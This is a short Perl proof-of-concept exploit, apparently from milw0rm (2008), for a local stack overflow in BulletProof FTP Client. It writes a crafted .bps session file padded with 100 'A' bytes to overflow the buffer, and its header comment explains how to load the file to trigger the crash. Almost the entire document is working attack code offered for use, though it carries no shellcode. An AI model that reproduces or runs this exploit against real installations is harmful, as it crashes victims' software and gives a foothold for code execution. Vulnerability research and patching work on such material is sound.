#!/usr/bin/perl
########################################
#[*] Bug : BulletProof FTP Client .bps Local Stack Overflow (PoC)
#[*] Founded by : Mountassif Moad
#[*] Greetz : All Freind Str0ke
#[*] HOw to use => go to file after Load BP session & Enter and boom :d overflowing :d
########################################
use warnings;
use strict;
my $chars   = "This is a BulletProof FTP Client Session-File and should not be modified directly.\n" .
                        "\x41" x 100 .
      "\n21\n".
      "Stack\n".
      "bpfhljamedaldlffpojmqhpo\n".
                        "c:\/\n" .
                        "/\n";
my $file="Stack.bps";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file has been created \n";
print "Credits:Stack";

# milw0rm.com [2008-12-28]